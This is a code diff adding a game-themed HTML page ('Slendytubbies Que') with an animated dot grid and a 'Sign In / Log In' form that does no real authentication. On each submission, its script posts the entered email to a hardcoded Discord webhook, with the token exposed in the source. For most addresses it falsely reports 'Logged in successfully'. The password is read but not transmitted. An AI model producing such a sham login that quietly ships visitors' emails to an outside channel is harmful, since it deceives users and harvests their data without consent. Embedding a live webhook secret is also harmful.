@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Slendytubbies Que</title>
+  <link rel="icon" href="logo.ico">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background-color: #111;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* Dot grid styling */
+    .grid {
+      position: absolute;
+      width: 5px; /* Size of each dot (smaller) */
+      height: 5px; /* Size of each dot (smaller) */
+      background-color: rgba(52, 152, 219, 0.5); /* Light blue color for the dots */
+      border-radius: 50%; /* Make the dots circular */
+      transition: box-shadow 0.3s ease, transform 0.2s ease; /* Smooth transition for glow effect and movement */
+    }
+
+    /* Glow effect for dots */
+    .glow {
+      box-shadow: 0 0 10px #00f, 0 0 20px #00f; /* Light blue glow effect */
+    }
+
+    /* Button styling */
+    .button-container {
+      z-index: 1; /* Ensure buttons are above the grid */
+      display: flex;
+      gap: 20px;
+      position: relative; /* Make sure buttons are positioned correctly */
+      top: 50px; /* Position buttons from top */
+      left: 50%; /* Center the buttons horizontally */
+      transform: translateX(-50%); /* Centering */
+    }
+
+    .button {
+      padding: 15px 30px;
+      background-color: #3498db;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #2980b9;
+    }
+
+    /* Form styling */
+    .form-container {
+      position: absolute;
+      top: 50%;
+      right: 20px;
+      transform: translateY(-50%);
+      background-color: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 10px;
+      color: white;
+      width: 250px;
+    }
+
+    .form-container h2 {
+      text-align: center;
+    }
+
+    .form-container input {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: none;
+      border-radius: 5px;
+    }
+
+    .form-container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3498db;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.1s ease; /* Added transform transition */
+    }
+
+    .form-container button:hover {
+      background-color: #2980b9;
+    }
+
+    /* Move down effect */
+    .move-down {
+      transform: translateY(5px); /* Move down slightly */
+    }
+  </style>
+</head>
+<body>
+
+<!-- Button Container for Contact and Projects -->
+<div class="button-container" id="buttonContainer">
+  <button class="button" id="contactBtn">Contact</button>
+  <button class="button" id="projectsBtn">Projects</button>
+</div>
+
+<!-- Form Container for Sign In and Log In -->
+<div class="form-container">
+  <h2>Sign In / Log In</h2>
+  <input type="email" id="email" placeholder="Email" required>
+  <input type="password" id="password" placeholder="Password" required>
+  <button id="loginBtn">Log In</button>
+  <button id="signInBtn">Sign In</button>
+</div>
+
+<script>
+  const dotSize = 60; // Size of each dot in pixels (smaller)
+  const dotElements = []; // To keep track of dot elements
+  const glowRadius = 200; // Radius of the hitbox for glow effect
+  const hitboxRadius = 50; // Radius of the sphere hitbox around the mouse
+  const bounceDistance = 20; // Distance to move dots away from the mouse
+
+  let fakeEmailCount = 0; // Count of fake email attempts
+  const maxAttempts = 3; // Maximum allowed fake email attempts
+  let blockTime = 0; // Current block time
+  const blockIncrement = 10; // Time to block the user after max attempts
+
+  // Create dot elements and append to body
+  const createDots = () => {
+    for (let x = 0; x < Math.ceil(window.innerWidth / dotSize); x++) {
+      for (let y = 0; y < Math.ceil(window.innerHeight / dotSize); y++) {
+        const dot = document.createElement('div');
+        dot.classList.add('grid'); // Add grid class
+        dot.style.left = `${x * dotSize}px`; // Positioning dot elements
+        dot.style.top = `${y * dotSize}px`;
+        document.body.appendChild(dot);
+        dotElements.push(dot); // Store the dot element
+      }
+    }
+  };
+
+  createDots(); // Call function to create dots
+
+  // Add mousemove event listener
+  document.addEventListener('mousemove', (event) => {
+    const mouseX = event.clientX;
+    const mouseY = event.clientY;
+
+    dotElements.forEach((dot) => {
+      const rect = dot.getBoundingClientRect();
+      // Calculate distance from mouse to dot's center
+      const dotX = rect.left + rect.width / 2;
+      const dotY = rect.top + rect.height / 2;
+      const distance = Math.sqrt(Math.pow(mouseX - dotX, 2) + Math.pow(mouseY - dotY, 2));
+
+      // Apply glow effect if mouse is within the glow radius
+      if (distance <= glowRadius) {
+        dot.classList.add('glow');
+      } else {
+        dot.classList.remove('glow');
+      }
+
+      // Move dots away from the mouse if within the hitbox radius
+      if (distance <= hitboxRadius) {
+        const angle = Math.atan2(mouseY - dotY, mouseX - dotX);
+        const xOffset = (hitboxRadius + bounceDistance) * Math.cos(angle);
+        const yOffset = (hitboxRadius + bounceDistance) * Math.sin(angle);
+        dot.style.transform = `translate(${-xOffset}px, ${-yOffset}px)`; // Move away from the mouse
+      } else {
+        dot.style.transform = 'translate(0px, 0px)'; // Reset position
+      }
+    });
+  });
+
+  // Projects button event listener
+  document.getElementById('projectsBtn').addEventListener('click', () => {
+    window.location.href = 'https://itch.io/register'; // Change this to the desired URL
+  });
+
+  // Discord webhook URL (replace with your actual webhook URL)
+  const webhookUrl = 'https://discordapp.com/api/webhooks/1292330726359826475/bHWa98ufk0yWqodanQi-S7BkwYzO1_EsEs4oLC_Nm7QAc6hZW515DZ5aHpKA6gqnv07Y';
+
+  // Function to check if the email is fake
+  const isFakeEmail = (email) => {
+    const fakeDomains = ['fake.com', 'test.com', 'example.com']; // Add more fake domains as needed
+    const domain = email.split('@')[1];
+    return fakeDomains.includes(domain);
+  };
+
+  // Function to send data to Discord webhook
+  const sendToWebhook = (email, isFake) => {
+    const messageContent = isFake
+      ? `Fake email detected: ${email}`
+      : `Email: ${email} is valid.`;
+
+    const data = {
+      content: messageContent
+    };
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+    })
+      .then(response => {
+        if (response.ok) {
+          console.log('Data sent to webhook successfully');
+        } else {
+          console.error('Failed to send data to webhook');
+        }
+      })
+      .catch(error => {
+        console.error('Error sending data to webhook:', error);
+      });
+  };
+
+  // Function to display messages to the user (you can customize this)
+  const displayMessage = (message, type) => {
+    alert(`${type.toUpperCase()}: ${message}`);
+  };
+
+  // Function to handle button click effect
+  const handleButtonClickEffect = (button) => {
+    button.classList.add('move-down');
+    setTimeout(() => {
+      button.classList.remove('move-down');
+    }, 150); // Duration of the move-down effect
+  };
+
+  // Login button event listener
+  document.getElementById('loginBtn').addEventListener('click', () => {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if (isFakeEmail(email)) {
+      fakeEmailCount++;
+      if (fakeEmailCount >= maxAttempts) {
+        blockTime += blockIncrement;
+        displayMessage(`You are temporarily blocked for ${blockTime} seconds due to multiple fake email attempts.`, 'error');
+        // Disable login button
+        document.getElementById('loginBtn').disabled = true;
+        setTimeout(() => {
+          document.getElementById('loginBtn').disabled = false;
+          fakeEmailCount = 0; // Reset fake email count after block time
+        }, blockTime * 1000);
+      } else {
+        displayMessage('Please use a valid email address.', 'warning');
+      }
+      sendToWebhook(email, true); // Send fake email notification
+    } else {
+      // Successful login
+      displayMessage('Logged in successfully. Please verify your email.', 'success');
+      sendToWebhook(email, false); // Send valid email notification
+      handleButtonClickEffect(document.getElementById('loginBtn')); // Apply button click effect
+    }
+  });
+
+  // Sign In button event listener
+  document.getElementById('signInBtn').addEventListener('click', () => {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if (isFakeEmail(email)) {
+      displayMessage('Please use a valid email address.', 'warning');
+      sendToWebhook(email, true); // Send fake email notification
+    } else {
+      // Successful sign-in
+      displayMessage('Signed in successfully. Please verify your email.', 'success');
+      sendToWebhook(email, false); // Send valid email notification
+      handleButtonClickEffect(document.getElementById('signInBtn')); // Apply button click effect
+    }
+  });
+</script>
+</body>
+</html>
